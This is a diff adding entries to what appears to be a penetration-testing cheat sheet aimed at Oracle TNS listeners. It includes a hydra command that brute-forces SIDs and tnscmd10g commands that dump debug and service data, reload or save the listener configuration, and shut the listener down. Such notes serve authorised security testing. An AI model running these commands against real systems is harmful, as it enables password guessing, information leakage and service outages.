@@ -1436,6 +1436,9 @@ hydra l user_name_here -p /path/to/wordlist url_here http-form-post "/path/to/lo
 
 # brute-force Oracle TNS listener password
 hydra -P wordlist_here -t number_of_threads_here -s 1521 IP_here oracle-listener
+
+# brute-force SIDs ORacle TNS listener password
+hydra -L SID_wordlist_here -s 1521 IP_here oracle-sid
 ```
 
 
@@ -3157,17 +3160,33 @@ prefix + alt + shift + p
 # ping Oracle TNS listener
 tnscmd10g -h IP_here -p 1521
 
+# dump debug info into listener log
+tnscmd10g debug -h IP_here -p 1521
+tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=debug))"
+
+# reload config file for listener
+tnscmd10g reload -h IP_here -p 1521
+tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=reload))"
+
+# save config file for listener
+tnscmd10g save_config -h IP_here -p 1521
+tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=save_config))"
+
+# dump service data
+tnscmd10g service -h IP_here -p 1521
+tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=service))"
+
 # retrieve status
 tnscmd10g status -h IP_here -p 1521
 tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=status))"
 
+# shut down listener
+tnscmd10g stop -h IP_here -p 1521
+tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=stop))"
+
 # enumerate version
 tnscmd10g version -h IP_here -p 1521
 tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=version))"
-
-# enumerate service
-tnscmd10g service -h IP_here -p 1521
-tnscmd10g -h IP_here -p 1521 --rawcmd "(CONNECT_DATA=(COMMAND=service))"
 ```
 
 
